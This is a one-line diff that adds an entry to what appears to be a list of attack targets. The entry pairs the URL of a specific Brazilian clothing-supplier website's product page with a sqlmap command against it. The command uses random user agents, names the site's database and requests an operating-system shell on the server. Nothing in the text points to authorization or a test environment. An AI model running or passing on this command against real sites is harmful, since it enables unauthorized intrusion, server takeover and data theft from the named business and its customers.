@@ -1,0 +1,1 @@
+http://www.ebtuniformes.com.br/produtos.php?produto_id=7 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.ebtuniformes.com.br/produtos.php?produto_id=7 -D ebtuniformes --os-shell
